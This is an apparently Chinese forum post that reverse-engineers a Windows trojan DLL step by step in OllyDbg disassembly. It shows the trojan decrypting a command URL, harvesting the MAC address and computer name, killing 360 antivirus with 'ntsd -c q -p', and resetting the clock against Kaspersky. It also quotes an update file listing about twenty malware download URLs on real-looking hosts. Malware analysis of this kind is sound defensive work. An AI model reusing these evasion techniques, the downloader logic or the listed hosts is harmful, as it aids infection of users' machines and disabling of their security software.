10002EC2  |.  50            push    eax                                 ;  "pcbe.<=h!;<ugh'ki)vkev."  
10002EC3  |.  E8 F4FBFFFF   call    10002ABC        ///解密函数  
这个"pcbe.<=h!;<ugh'ki)vkev."是什么???没有任何具体含义阿!?病毒岂不是白读文件了???不会的,这个肯定是加密以后的字符串,看它的解密结果  
在 10002ec3 这个 call 之后呢，堆栈中  
0006EECC   0006EEE4  
0006EED0   10007090  ASCII "http://nx.51ylb.cn/soft/"  
这就是解密结果了，一个网络连接，登陆一下，没有权限（由此可以基本确定这就是个毒站，呵呵）  
  
病毒关闭文件，我们从函数里面返回  
100026E3  |.  68 68A50010   push    1000A568  
100026E8  |.  E8 3AFCFFFF   call    10002327  
  
进去，看到连接网络的代码  
10002327  /$  55            push    ebp  
10002328  |.  8BEC          mov     ebp, esp  
1000232A  |.  81EC D8000000 sub     esp, 0D8  
10002330  |.  56            push    esi                                   ;  装载 rpc 库  
10002331  |.  68 346D0010   push    10006D34                              ; /FileName = "rpcrt4.dll"  
10002336  |.  FF15 D0500010 call    dword ptr \[<&KERNEL32.LoadLibraryA>\]  ; \\LoadLibraryA  
1000233C  |.  8BF0          mov     esi, eax  
1000233E  |.  85F6          test    esi, esi  
10002340  |.  74 2B         je      short 1000236D  
10002342  |.  68 1C6D0010   push    10006D1C                              ; /ProcNameOrOrdinal = "UuidCreateSequential"  
10002347  |.  56            push    esi                                   ; |hModule  
10002348  |.  FF15 DC500010 call    dword ptr \[<&KERNEL32.GetProcAddress>>; \\GetProcAddress  
1000234E  |.  85C0          test    eax, eax  
10002350  |.  74 08         je      short 1000235A                        ;  获取函数 RPCRT4.UuidCreateSequential 的入口地址失败，跳走  
10002352  |.  8D4D F0       lea     ecx, dword ptr \[ebp-10\]  
10002355  |.  51            push    ecx  
10002356  |.  FFD0          call    eax                                   ;  RPCRT4.UuidCreateSequential  
10002358  |.  EB 0A         jmp     short 10002364  
1000235A  |>  8D45 F0       lea     eax, dword ptr \[ebp-10\]  
1000235D  |.  50            push    eax                                   ;  获取函数 RPCRT4.UuidCreateSequential 的入口地址失败，采用 ole32.CoCreateGuid 方式  
1000235E  |.  FF15 60510010 call    dword ptr \[<&ole32.CoCreateGuid>\]     ;  ole32.CoCreateGuid  
10002364  |>  56            push    esi                                   ; /hLibModule  
10002365  |.  FF15 D8500010 call    dword ptr \[<&KERNEL32.FreeLibrary>\]   ; \\FreeLibrary  
1000236B  |.  EB 0A         jmp     short 10002377  
1000236D  |>  8D45 F0       lea     eax, dword ptr \[ebp-10\]  
10002370  |.  50            push    eax  
10002371  |.  FF15 60510010 call    dword ptr \[<&ole32.CoCreateGuid>\]     ;  ole32.CoCreateGuid  
10002377  |>  BE 00AE0010   mov     esi, 1000AE00  
以上分析不知道对不对，反正我对网络的 api 不是很熟悉，大概能分析出它的意思  
  
跳过一路的 sprintf 来到  
10002442  |.  0FB645 FF     movzx   eax, byte ptr \[ebp-1\]  
10002446  |.  50            push    eax                                   ; /<%2.2X>  
10002447  |.  0FB645 FE     movzx   eax, byte ptr \[ebp-2\]                 ; |  
1000244B  |.  50            push    eax                                   ; |<%2.2X>  
1000244C  |.  0FB645 FD     movzx   eax, byte ptr \[ebp-3\]                 ; |  
10002450  |.  50            push    eax                                   ; |<%2.2X>  
10002451  |.  0FB645 FC     movzx   eax, byte ptr \[ebp-4\]                 ; |  
10002455  |.  50            push    eax                                   ; |<%2.2X>  
10002456  |.  0FB645 FB     movzx   eax, byte ptr \[ebp-5\]                 ; |  
1000245A  |.  50            push    eax                                   ; |<%2.2X>  
1000245B  |.  0FB645 FA     movzx   eax, byte ptr \[ebp-6\]                 ; |  
1000245F  |.  50            push    eax                                   ; |<%2.2X>  
10002460  |.  68 F86C0010   push    10006CF8                              ; |Format = "%2.2X-%2.2X-%2.2X-%2.2X-%2.2X-%2.2X"  
10002465  |.  FF75 08       push    dword ptr \[ebp+8\]                     ; |s  
10002468  |.  FF15 4C510010 call    dword ptr \[<&USER32.wsprintfA>\]       ; \\wsprintfA  
  
看堆栈!!!  
0006F084   1000A568  |s = 555E9A24.1000A568  
0006F088   10006CF8  |Format = "%2.2X-%2.2X-%2.2X-%2.2X-%2.2X-%2.2X"  
0006F08C   00000000  |<%2.2X> = 0  
0006F090   0000000C  |<%2.2X> = C  
0006F094   00000029  |<%2.2X> = 29  
0006F098   0000004F  |<%2.2X> = 4F  
0006F09C   000000C5  |<%2.2X> = C5  
0006F0A0   00000096  \\<%2.2X> = 96  
  
在数据窗口中跟踪 1000A568 这个地址;在执行 call    dword ptr \[<&USER32.wsprintfA>\] 后,数据窗口如图  
1000A568  30 30 2D 30 43 2D 32 39 2D 34 46 2D 43 35 2D 39  00-0C-29-4F-C5-9  
1000A578  36 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  6...............  
我的网卡 MAC!!!  
  
随着函数返回,来到  
100026F3  |.  50            push    eax                                   ; /pBufferSize  
100026F4  |.  68 9C730010   push    1000739C                              ; |Buffer = 555E9A24.1000739C  
100026F9  |.  FF15 84500010 call    dword ptr \[<&KERNEL32.GetComputerName>; \\GetComputerNameA  
病毒获取了你的 ComputerName  
  
紧接着,病毒获取它所被钩挂在的进程  
这句话有点绕,意思就是说如果%system32%\\555E9A24.DLL 被钩挂在进程 EXPLORER.EXE 中,则返回%WINDOWS%\\EXPLORER.EXE  
10002711  |.  8D85 24FDFFFF lea     eax, dword ptr \[ebp-2DC\]  
10002717  |.  68 04010000   push    104                                   ; /BufSize = 104 (260.)  
1000271C  |.  50            push    eax                                   ; |PathBuffer  
1000271D  |.  6A 00         push    0                                     ; |hModule = NULL  
1000271F  |.  FF15 88500010 call    dword ptr \[<&KERNEL32.GetModuleFileNa>; \\GetModuleFileNameA  
10002725  |.  85C0          test    eax, eax  
10002727  |.  0F84 8A030000 je      10002AB7        ///获取失败,跳走  
  
一路前行,终于来到  
100027B1  |.  68 04690010   push    10006904                              ; /s2 = "winlogon.exe"  
100027B6  |.  50            push    eax                                   ; |s1  
100027B7  |.  E8 F61B0000   call    <jmp.&MSVCRT.strstr>                  ; \\strstr  
100027BC  |.  BF AC760010   mov     edi, 100076AC                         ;  测试当前进程是不是 winlogon.exe  
100027C1  |.  68 986D0010   push    10006D98                              ; /src = "http://a"  
100027C6  |.  57            push    edi                                   ; |dest => 555E9A24.100076AC  
100027C7  |.  E8 DA1B0000   call    <jmp.&MSVCRT.strcpy>                  ; \\strcpy  
100027CC  |.  68 8C6D0010   push    10006D8C                              ; /src = "lexa.verynx"  
100027D1  |.  57            push    edi                                   ; |dest  
100027D2  |.  E8 D51B0000   call    <jmp.&MSVCRT.strcat>                  ; \\strcat  
100027D7  |.  68 846D0010   push    10006D84                              ; /src = ".cn/"  
100027DC  |.  57            push    edi                                   ; |dest  
100027DD  |.  E8 CA1B0000   call    <jmp.&MSVCRT.strcat>                  ; \\strcat  
100027E2  |.  BF 00AE0010   mov     edi, 1000AE00                         ;  //看堆栈  
我们看一下堆栈中显示的字符串的运算结果  
0006F1B0   100076AC  ASCII "http://alexa.verynx.cn/"  
0006F1B4   10006D84  ASCII ".cn/"  
又是一个网络连接,记住它,会有用的  
  
继续前进,来到  
10002989  |.  50            push    eax                                   ; /s2  
1000298A  |.  8D85 24FDFFFF lea     eax, dword ptr \[ebp-2DC\]              ; |  
10002990  |.  50            push    eax                                   ; |/StringOrChar  
10002991  |.  FFD7          call    edi                                   ; |\\CharUpperA  
10002993  |.  50            push    eax                                   ; |s1  
10002994  |.  E8 191A0000   call    <jmp.&MSVCRT.strstr>                  ; \\strstr  
10002999  |.  59            pop     ecx                                   ;  这个函数的两个输入参数是：  
1000299A  |.  85C0          test    eax, eax                              ;  s1 = "C:\\DOCUMENTS AND SETTINGS\\CTS.ANCUI\\",D7,"烂 PEDIY\\OLLYICE\\LOADDLL.EXE"  
1000299C  |.  59            pop     ecx                                   ;  s2 = "WINLOGON.EXE"  
1000299D  |.  74 6B         je      short 10002A0A                        ;  ///很明显如果当前进程不是 winlogon.exe 的话，跳走  
1000299F  |.  8B3D B4500010 mov     edi, dword ptr \[<&KERNEL32.CreateThre>;  kernel32.CreateThread  
100029A5  |.  8D45 FC       lea     eax, dword ptr \[ebp-4\]                ;  ///如果单前进程是 winlogon.exe 的话，执行这里（听说 winlogon.exe 的优先级比较高，嘿嘿）  
100029A8  |.  33DB          xor     ebx, ebx  
100029AA  |.  50            push    eax                                   ; /pThreadId  
100029AB  |.  53            push    ebx                                   ; |CreationFlags => 0  
100029AC  |.  53            push    ebx                                   ; |pThreadParm => NULL  
100029AD  |.  68 00100010   push    10001000                              ; |ThreadFunction = 555E9A24.10001000  
100029B2  |.  53            push    ebx                                   ; |StackSize => 0  
100029B3  |.  53            push    ebx                                   ; |pSecurity => NULL  
100029B4  |.  FFD7          call    edi                                   ; \\CreateThread  
100029B6  |.  8D45 FC       lea     eax, dword ptr \[ebp-4\]  
100029B9  |.  50            push    eax                                   ; /pThreadId  
100029BA  |.  53            push    ebx                                   ; |CreationFlags => 0  
100029BB  |.  53            push    ebx                                   ; |pThreadParm => NULL  
100029BC  |.  68 15380010   push    10003815                              ; |ThreadFunction = 555E9A24.10003815  
100029C1  |.  53            push    ebx                                   ; |StackSize => 0  
100029C2  |.  53            push    ebx                                   ; |pSecurity => NULL  
100029C3  |.  FFD7          call    edi                                   ; \\CreateThread  
100029C5  |.  8D45 FC       lea     eax, dword ptr \[ebp-4\]  
100029C8  |.  50            push    eax                                   ; /pThreadId  
100029C9  |.  53            push    ebx                                   ; |CreationFlags => 0  
100029CA  |.  53            push    ebx                                   ; |pThreadParm => NULL  
100029CB  |.  68 871F0010   push    10001F87                              ; |ThreadFunction = 555E9A24.10001F87  
100029D0  |.  53            push    ebx                                   ; |StackSize => 0  
100029D1  |.  53            push    ebx                                   ; |pSecurity => NULL  
100029D2  |.  FFD7          call    edi                                   ; \\CreateThread  
100029D4  |.  8D45 FC       lea     eax, dword ptr \[ebp-4\]  
100029D7  |.  50            push    eax                                   ; /pThreadId  
100029D8  |.  53            push    ebx                                   ; |CreationFlags => 0  
100029D9  |.  53            push    ebx                                   ; |pThreadParm => NULL  
100029DA  |.  68 2F100010   push    1000102F                              ; |ThreadFunction = 555E9A24.1000102F  
100029DF  |.  53            push    ebx                                   ; |StackSize => 0  
100029E0  |.  53            push    ebx                                   ; |pSecurity => NULL  
100029E1  |.  FFD7          call    edi                                   ; \\CreateThread  
100029E3  |.  8D45 FC       lea     eax, dword ptr \[ebp-4\]  
100029E6  |.  50            push    eax                                   ; /pThreadId  
100029E7  |.  53            push    ebx                                   ; |CreationFlags => 0  
100029E8  |.  53            push    ebx                                   ; |pThreadParm => NULL  
100029E9  |.  68 4B200010   push    1000204B                              ; |ThreadFunction = 555E9A24.1000204B  
100029EE  |.  53            push    ebx                                   ; |StackSize => 0  
100029EF  |.  53            push    ebx                                   ; |pSecurity => NULL  
100029F0  |.  FFD7          call    edi                                   ; \\CreateThread  
100029F2  |.  68 046A0010   push    10006A04                              ; /Arg2 = 10006A04 ASCII "explorer.exe"  
100029F7  |.  68 04670010   push    10006704                              ; |Arg1 = 10006704 ASCII "555E9A24.DLL"  
100029FC  |.  E8 38F7FFFF   call    10002139                              ; \\555E9A24.10002139  
10002A01  |>  68 E8030000   /push    3E8  
10002A06  |.  FFD6          |call    esi  
10002A08  |.^ EB F7         \\jmp     short 10002A01  
10002A0A  |>  68 046A0010   push    10006A04                              ;  ASCII "explorer.exe"  
10002A0F  |.  FFD7          call    edi  
10002A11  |.  50            push    eax  
10002A12  |.  8D85 24FDFFFF lea     eax, dword ptr \[ebp-2DC\]  
10002A18  |.  50            push    eax  
10002A19  |.  FFD7          call    edi  
10002A1B  |.  50            push    eax                                   ; |s1  
10002A1C  |.  E8 91190000   call    <jmp.&MSVCRT.strstr>                  ; \\strstr  
10002A21  |.  59            pop     ecx                                   ;  检测当前进程是不是 explorer.exe  
10002A22  |.  85C0          test    eax, eax  
10002A24  |.  59            pop     ecx  
10002A25  |.  74 28         je      short 10002A4F                        ;  如果不是,跳走  
10002A27  |.  8B3D B4500010 mov     edi, dword ptr \[<&KERNEL32.CreateThre>;  kernel32.CreateThread  
10002A2D  |.  8D45 FC       lea     eax, dword ptr \[ebp-4\]  
10002A30  |.  33DB          xor     ebx, ebx  
10002A32  |.  50            push    eax                                   ; /pThreadId  
10002A33  |.  53            push    ebx                                   ; |CreationFlags => 0  
10002A34  |.  53            push    ebx                                   ; |pThreadParm => NULL  
10002A35  |.  68 221F0010   push    10001F22                              ; |ThreadFunction = 555E9A24.10001F22  
10002A3A  |.  53            push    ebx                                   ; |StackSize => 0  
10002A3B  |.  53            push    ebx                                   ; |pSecurity => NULL  
10002A3C  |.  FFD7          call    edi                                   ; \\CreateThread  
10002A3E  |.  8D45 FC       lea     eax, dword ptr \[ebp-4\]  
10002A41  |.  50            push    eax                                   ; /pThreadId  
10002A42  |.  53            push    ebx                                   ; |CreationFlags => 0  
10002A43  |.  53            push    ebx                                   ; |pThreadParm => NULL  
10002A44  |.  68 61250010   push    10002561                              ; |ThreadFunction = 555E9A24.10002561  
10002A49  |.  53            push    ebx                                   ; |StackSize => 0  
10002A4A  |.  53            push    ebx                                   ; |pSecurity => NULL  
10002A4B  |.  FFD7          call    edi                                   ; \\CreateThread  
10002A4D  |.^ EB B2         jmp     short 10002A01  
10002A4F  |>  53            push    ebx  
上面的代码比较长，但是大体上是分支语句  
if(CurrentProcess == "WINLOGON.EXE")  
  do A;  
elseif(CurrentProcess == "EXPLORER.EXE")  
  do B;  
else  
  do C;  
懂了吧，呵呵  
  
下面如果单前进程是 winlogon.exe 的话，看看病毒如何破坏（执行到 1000299D 时,在 1000299F 右键，此处为 EIP，呵呵，这个方法贼好使，当然你的保证堆栈等东西的平衡）  
创建了几个线程,我们一个一个地分析功能,CTRL+G,输入 10001000,来到(继续我的伎俩,此处为新 EIP,哈哈)  
10001000   .  55            push    ebp  
10001001   .  8BEC          mov     ebp, esp  
10001003   .  83EC 10       sub     esp, 10  
10001006   >  8D45 F0       lea     eax, dword ptr \[ebp-10\]  
10001009   .  50            push    eax                                   ; /pSystemTime  
1000100A   .  FF15 94500010 call    dword ptr \[<&KERNEL32.GetSystemTime>\] ; \\GetSystemTime  
10001010   .  66:817D F0 D5>cmp     word ptr \[ebp-10\], 7D5  
10001016   .  76 0A         jbe     short 10001022  
10001018   .  8D45 F0       lea     eax, dword ptr \[ebp-10\]  
1000101B   .  50            push    eax                                   ; /pSystemTime  
1000101C   .  FF15 90500010 call    dword ptr \[<&KERNEL32.SetSystemTime>\] ; \\SetSystemTime    ///又是修改系统时间,来使得卡巴斯基无效  
10001022   >  68 D0070000   push    7D0                                   ; /Timeout = 2000. ms  
10001027   .  FF15 8C500010 call    dword ptr \[<&KERNEL32.Sleep>\]         ; \\Sleep  
1000102D   .^\\EB D7         jmp     short 10001006  
上面是一个带有 sleep 的死循环,不停的修改系统时间，也就是说，这个线程是对付卡巴斯基的。  
  
下一个线程,CTRL+G,10003815 来到  
10003815   > /E8 BBFEFFFF   call    100036D5        ////杀除 360，并删除 360 的启动项  
1000381A   . |68 E8030000   push    3E8                                   ; /Timeout = 1000. ms  
1000381F   . |FF15 8C500010 call    dword ptr \[<&KERNEL32.Sleep>\]         ; \\Sleep  
10003825   .^\\EB EE         jmp     short 10003815  
  
又是一个带有 sleep 的死循环，进 call  
100036D5  /$  55            push    ebp  
100036D6  |.  8BEC          mov     ebp, esp  
100036D8  |.  B8 7C1E0000   mov     eax, 1E7C  
100036DD  |.  E8 EE0C0000   call    100043D0                              ;  没有有用的东西  
  
往下走，经过一些和注册表相关字符串，来到一个循环  
1000376F  |> /8D5F E7       /lea     ebx, dword ptr \[edi-19\]              ;  "360"  
10003772  |. |53            |push    ebx                                  ; /s  
10003773  |. |E8 460C0000   |call    <jmp.&MSVCRT.strlen>                 ; \\strlen  
10003778  |. |83F8 03       |cmp     eax, 3  
1000377B  |. |59            |pop     ecx  
1000377C  |. |72 07         |jb      short 10003785                       ;  字符串长度小于 3,跳走  
1000377E  |. |53            |push    ebx                                  ;  "360"  
1000377F  |. |E8 50010000   |call    100038D4                             ;  杀死 360 的函数////在下面，会详细一下  
10003784  |. |59            |pop     ecx  
10003785  |> |6A 05         |push    5  
10003787  |. |FFD6          |call    esi  
10003789  |. |57            |push    edi                                  ; /s  
1000378A  |. |E8 2F0C0000   |call    <jmp.&MSVCRT.strlen>                 ; \\strlen  
1000378F  |. |83F8 03       |cmp     eax, 3  
10003792  |. |59            |pop     ecx  
10003793  |. |72 34         |jb      short 100037C9  
10003795  |. |8D85 34FFFFFF |lea     eax, dword ptr \[ebp-CC\]  
1000379B  |. |50            |push    eax                                  ; /src  
1000379C  |. |8D85 D0FEFFFF |lea     eax, dword ptr \[ebp-130\]             ; |  
100037A2  |. |50            |push    eax                                  ; |dest  
100037A3  |. |E8 FE0B0000   |call    <jmp.&MSVCRT.strcpy>                 ; \\strcpy  
100037A8  |. |8D85 D0FEFFFF |lea     eax, dword ptr \[ebp-130\]  
100037AE  |. |57            |push    edi                                  ; /src  
100037AF  |. |50            |push    eax                                  ; |dest  
100037B0  |. |E8 F70B0000   |call    <jmp.&MSVCRT.strcat>                 ; \\strcat  
100037B5  |. |57            |push    edi  
100037B6  |. |E8 9B070000   |call    10003F56                             ;  注册自身服务  
100037BB  |. |83C4 14       |add     esp, 14  
100037BE  |. |6A 05         |push    5  
100037C0  |. |FFD6          |call    esi  
100037C2  |. |57            |push    edi  
100037C3  |. |E8 13070000   |call    10003EDB                             ;  也是注册自身服务,方法不同  
100037C8  |. |59            |pop     ecx  
100037C9  |> |8D5F 19       |lea     ebx, dword ptr \[edi+19\]  
100037CC  |. |53            |push    ebx                                  ; /s  
100037CD  |. |E8 EC0B0000   |call    <jmp.&MSVCRT.strlen>                 ; \\strlen  
100037D2  |. |83F8 01       |cmp     eax, 1  
100037D5  |. |59            |pop     ecx  
100037D6  |. |76 21         |jbe     short 100037F9  
100037D8  |. |8D45 98       |lea     eax, dword ptr \[ebp-68\]  
100037DB  |. |53            |push    ebx  
100037DC  |. |50            |push    eax  
100037DD  |. |68 01000080   |push    80000001  
100037E2  |. |E8 BF060000   |call    10003EA6                             ;  删除注册表中的启动项,当然不是删除自己的,删除 360 的  
100037E7  |. |8D45 98       |lea     eax, dword ptr \[ebp-68\]              ; |  
100037EA  |. |53            |push    ebx                                  ; |Arg3  
100037EB  |. |50            |push    eax                                  ; |Arg2  
100037EC  |. |68 02000080   |push    80000002                             ; |Arg1 = 80000002  
100037F1  |. |E8 B0060000   |call    10003EA6                             ; \\555E9A24.10003EA6  
100037F6  |. |83C4 18       |add     esp, 18                              ;  也是删除启动项,估计经过上面的删除后,什么杀毒软件都很难随机器一起启动  
100037F9  |> |6A 05         |push    5  
100037FB  |. |FFD6          |call    esi  
100037FD  |. |6A 0A         |push    0A  
100037FF  |. |FFD6          |call    esi  
10003801  |. |83C7 4B       |add     edi, 4B  
10003804  |. |FF4D FC       |dec     dword ptr \[ebp-4\]  
10003807  |.^\\0F85 62FFFFFF \\jnz     1000376F  
  
我把 1000377F 处病毒杀除 360 的函数详细一下  
100038D4  /$  55            push    ebp  
100038D5  |.  8BEC          mov     ebp, esp  
100038D7  |.  81EC 78010000 sub     esp, 178  
100038DD  |.  53            push    ebx  
100038DE  |.  56            push    esi  
100038DF  |.  57            push    edi  
100038E0  |.  E8 F2FBFFFF   call    100034D7  
100038E5  |.  6A 00         push    0                                     ; /ProcessID = 0  
100038E7  |.  6A 02         push    2                                     ; |Flags = TH32CS\_SNAPPROCESS  
100038E9  |.  8BD8          mov     ebx, eax                              ; |  
100038EB  |.  C785 88FEFFFF>mov     dword ptr \[ebp-178\], 128              ; |  
100038F5  |.  E8 420B0000   call    <jmp.&KERNEL32.CreateToolhelp32Snapsh>; \\CreateToolhelp32Snapshot  
100038FA  |.  8BF8          mov     edi, eax  
100038FC  |.  8D85 88FEFFFF lea     eax, dword ptr \[ebp-178\]  
10003902  |.  50            push    eax                                   ; /pProcessentry  
10003903  |.  57            push    edi                                   ; |hSnapshot  
10003904  |.  E8 2D0B0000   call    <jmp.&KERNEL32.Process32First>        ; \\Process32First  
10003909  |.  8B35 50510010 mov     esi, dword ptr \[<&USER32.CharUpperA>\] ;  USER32.CharUpperA  
1000390F  |>  FF75 08       /push    dword ptr \[ebp+8\]  
10003912  |.  FFD6          |call    esi  
10003914  |.  50            |push    eax  
10003915  |.  8D85 ACFEFFFF |lea     eax, dword ptr \[ebp-154\]  
1000391B  |.  50            |push    eax  
1000391C  |.  FFD6          |call    esi  
1000391E  |.  50            |push    eax                                  ; |s1  
1000391F  |.  E8 8E0A0000   |call    <jmp.&MSVCRT.strstr>                 ; \\strstr  
10003924  |.  59            |pop     ecx  
10003925  |.  85C0          |test    eax, eax  
10003927  |.  59            |pop     ecx  
10003928  |.  74 78         |je      short 100039A2                       ;  如果当前进程不是 360,跳走  
1000392A  |.  FFB5 90FEFFFF |push    dword ptr \[ebp-170\]                  ;  否则,杀死  
10003930  |.  E8 5DFFFFFF   |call    10003892                             ;  杀死进程的函数  
10003935  |.  83F8 01       |cmp     eax, 1  
10003938  |.  59            |pop     ecx  
10003939  |.  75 67         |jnz     short 100039A2  
1000393B  |.  83FB 02       |cmp     ebx, 2  
1000393E  |.  75 62         |jnz     short 100039A2                       ;  如果没有杀死,下面用 NTSD 命令继续较劲  
10003940  |.  68 906E0010   |push    10006E90                             ;  ASCII "NTSD"  
10003945  |.  FFD6          |call    esi  
10003947  |.  50            |push    eax  
10003948  |.  FF75 08       |push    dword ptr \[ebp+8\]  
1000394B  |.  FFD6          |call    esi  
1000394D  |.  50            |push    eax                                  ; |s1  
1000394E  |.  E8 5F0A0000   |call    <jmp.&MSVCRT.strstr>                 ; \\strstr  
10003953  |.  59            |pop     ecx  
10003954  |.  85C0          |test    eax, eax  
10003956  |.  59            |pop     ecx  
10003957  |.  75 49         |jnz     short 100039A2  
10003959  |.  FFB5 90FEFFFF |push    dword ptr \[ebp-170\]                  ; /<%d>  
1000395F  |.  8D45 E4       |lea     eax, dword ptr \[ebp-1C\]              ; |  
10003962  |.  68 8C6E0010   |push    10006E8C                             ; |format = "%d"  
10003967  |.  50            |push    eax                                  ; |s  
10003968  |.  E8 330A0000   |call    <jmp.&MSVCRT.sprintf>                ; \\sprintf  
1000396D  |.  8D45 B0       |lea     eax, dword ptr \[ebp-50\]  
10003970  |.  68 7C6E0010   |push    10006E7C                             ; /src = "ntsd -c q -p "  
10003975  |.  50            |push    eax                                  ; |dest  
10003976  |.  E8 2B0A0000   |call    <jmp.&MSVCRT.strcpy>                 ; \\strcpy  
1000397B  |.  8D45 E4       |lea     eax, dword ptr \[ebp-1C\]  
1000397E  |.  50            |push    eax                                  ; /src  
1000397F  |.  8D45 B0       |lea     eax, dword ptr \[ebp-50\]              ; |  
10003982  |.  50            |push    eax                                  ; |dest  
10003983  |.  E8 240A0000   |call    <jmp.&MSVCRT.strcat>                 ; \\strcat  
10003988  |.  83C4 1C       |add     esp, 1C  
1000398B  |.  8D45 B0       |lea     eax, dword ptr \[ebp-50\]              ;  再次执行杀死命令  
1000398E  |.  6A 00         |push    0                                    ; /ShowState = SW\_HIDE  
10003990  |.  50            |push    eax                                  ; |CmdLine  
10003991  |.  FF15 A8500010 |call    dword ptr \[<&KERNEL32.WinExec>\]      ; \\WinExec  
10003997  |.  68 706E0010   |push    10006E70                             ;  ASCII "ntsd.exe"  
1000399C  |.  E8 33FFFFFF   |call    100038D4                             ;  函数嵌套,也就是说,不停的杀进程  
100039A1  |.  59            |pop     ecx  
100039A2  |>  8D85 88FEFFFF |lea     eax, dword ptr \[ebp-178\]  
100039A8  |.  50            |push    eax                                  ; /pProcessentry  
100039A9  |.  57            |push    edi                                  ; |hSnapshot  
100039AA  |.  E8 810A0000   |call    <jmp.&KERNEL32.Process32Next>        ; \\Process32Next  
100039AF  |.  85C0          |test    eax, eax  
100039B1  |.^ 0F85 58FFFFFF \\jnz     1000390F  
100039B7  |.  57            push    edi                                   ; /hObject  
100039B8  |.  FF15 98500010 call    dword ptr \[<&KERNEL32.CloseHandle>\]   ; \\CloseHandle  
100039BE  |.  5F            pop     edi                                   ;  杀完,爽了,走人  
100039BF  |.  5E            pop     esi  
100039C0  |.  33C0          xor     eax, eax  
100039C2  |.  5B            pop     ebx  
100039C3  |.  C9            leave  
100039C4  \\.  C3            retn  
退出循环，ret，这个线程分析完毕  
  
下一个线程，CTRL+G,10001F87,  
????????打住!!!!!!!!!!挑重点讲吧,千万别让大伙睡着了  
这个线程,专门用来注册自身服务的  
  
下一个线程专门用来禁用 Windows 错误报告和禁止用户查看隐藏文件  
  
  
下一个,很重要,1000204B,来到  
1000204B  /.  55            push    ebp  
1000204C  |.  8BEC          mov     ebp, esp  
1000204E  |.  81EC 10020000 sub     esp, 210  
10002054  |.  53            push    ebx  
10002055  |.  56            push    esi  
  
下面这个循环  
100020B5  |> /8D85 F4FEFFFF /lea     eax, dword ptr \[ebp-10C\]             ;  "C:\\WINDOWS\\system32\\dd33gsd2.exe"  
100020BB  |. |50            |push    eax                                  ; /Path  
100020BC  |. |FF15 2C510010 |call    dword ptr \[<&SHLWAPI.PathFileExistsA>; \\PathFileExistsA  
100020C2  |. |85C0          |test    eax, eax  
100020C4  |. |75 4F         |jnz     short 10002115                       ;  文件不存在,跳走  
100020C6  |. |43            |inc     ebx  
100020C7  |. |83FB 0A       |cmp     ebx, 0A  
100020CA  |. |7F 65         |jg      short 10002131  
100020CC  |. |8D45 FC       |lea     eax, dword ptr \[ebp-4\]  
100020CF  |. |50            |push    eax                                  ; /timer  
100020D0  |. |E8 E3220000   |call    <jmp.&MSVCRT.time>                   ; \\time  
100020D5  |. |56            |push    esi                                  ; /n  
100020D6  |. |8D85 F0FDFFFF |lea     eax, dword ptr \[ebp-210\]             ; |  
100020DC  |. |6A 00         |push    0                                    ; |c = 00  
100020DE  |. |50            |push    eax                                  ; |s  
100020DF  |. |E8 1C230000   |call    <jmp.&MSVCRT.memset>                 ; \\memset  
100020E4  |. |FF75 FC       |push    dword ptr \[ebp-4\]                    ; /<%d>  
100020E7  |. |8D85 F0FDFFFF |lea     eax, dword ptr \[ebp-210\]             ; |  
100020ED  |. |68 C06C0010   |push    10006CC0                             ; |format = "did%d.s"  
100020F2  |. |50            |push    eax                                  ; |s  
100020F3  |. |E8 A8220000   |call    <jmp.&MSVCRT.sprintf>                ; \\sprintf  
100020F8  |. |8D85 F0FDFFFF |lea     eax, dword ptr \[ebp-210\]  
100020FE  |. |6A 01         |push    1  
10002100  |. |50            |push    eax  
10002101  |. |68 90700010   |push    10007090  
10002106  |. |E8 84F2FFFF   |call    1000138F                             ;  连接网络下载 http://nx.51ylb.cn/soft/update.txt 到本地命名为%system32%\\did1199784307.s  
1000210B  |. |83C4 28       |add     esp, 28                              ;  并根据下载文件,来下载新的病毒运行,修改系统参数  
1000210E  |. |68 A00F0000   |push    0FA0  
10002113  |. |FFD7          |call    edi  
10002115  |> |8D85 F4FEFFFF |lea     eax, dword ptr \[ebp-10C\]  
1000211B  |.  68 B46C0010   |push    10006CB4                             ;  ASCII "auto.exe"  
10002120  |.  50            |push    eax  
10002121  |.  E8 6E200000   |call    10004194                             ;  用下载下来的病毒更新病毒体自身,并更新每个驱动器下面的 auto.exe  
10002126  |.  59            |pop     ecx                                  ;  老牛了!!!  
10002127  |.  59            |pop     ecx  
10002128  |.  68 10270000   |push    2710  
1000212D  |.  FFD7          |call    edi  
1000212F  |.^ EB 84         \\jmp     short 100020B5  
最后推出循环,结束线程  
网络文件 http://nx.51ylb.cn/soft/update.txt(看到了吧，它要干什么，清楚的很)  

引用: \[update\] ver=2008010505 url=http://nx.51ylb.cn/soft ![](img/2674941de574f12fa6a3e90d2eb3468a.jpg)| b.doc/soft/e47e57844ef30ab4.exe updatetimer=180 \[startpage\] startpage=0 url=sssssssssssssssssss \[desktop\] desktop=0 count=1 title1=免费网络电话 url1=http://skype.tom.com/download/archive/01400974/SkypeClient.exe \[file\] file=1 file1=http://222.73.247.201/mh0618.exe filename1=ffsea1.exe ftime1=3 file2=http://222.73.247.201/my0616.exe filename2=ffsea2.exe ftime2=3 file3=http://222.73.247.201/qj0617.exe filename3=ffsea3.exe ftime3=3 file4=http://123.wwwwool.cn/tl0619.exe filename4=ffsea4.exe ftime4=3 file5=http://220.189.255.29/wow0617.exe filename5=ffsea5.exe ftime5=3 file6=http://222.73.254.67/dh3.exe filename6=ffsea6.exe ftime6=3 file7=http://220.189.255.29/qqsg.exe filename7=ffsea7.exe ftime7=3 file8=http://222.73.247.202/jh0619.exe filename8=ffsea8.exe ftime8=3 file9=http://222.73.254.67/zt0616.exe filename9=ffsea9.exe ftime9=3 file10=http://222.73.247.202/wl0618.exe filename10=ffsea10.exe ftime10=3 file11=http://220.189.255.29/cq0619.exe filename11=ffsea11.exe ftime11=3 file12=http://222.73.247.202/wd0618.exe filename12=ffsea12.exe ftime12=3 file13=http://222.73.254.67/huaxia.exe filename13=ffsea13.exe ftime13=3 file14=http://222.73.254.67/qqhx.exe filename14=ffsea14.exe ftime14=3 file15=http://220.189.255.29/dh0616.exe filename15=ffsea15.exe ftime15=3 file16=http://61.129.45.132/zy.exe filename16=ffsea16.exe ftime16=3 file17=http://61.129.45.132/jr.exe filename17=ffsea17.exe ftime17=3 file18=http://61.129.45.132/fh.exe filename18=ffsea18.exe ftime18=3 file19=http://123.wwwwool.cn/jt.exe filename19=ffsea19.exe ftime19=3 file20=http://123.wwwwool.cn/mh2.exe filename20=ffsea20.exe ftime20=3 file21=http://220.189.255.29/cs0619.exe filename21=ffsea21.exe ftime21=3 count=21 \[count\] count=0 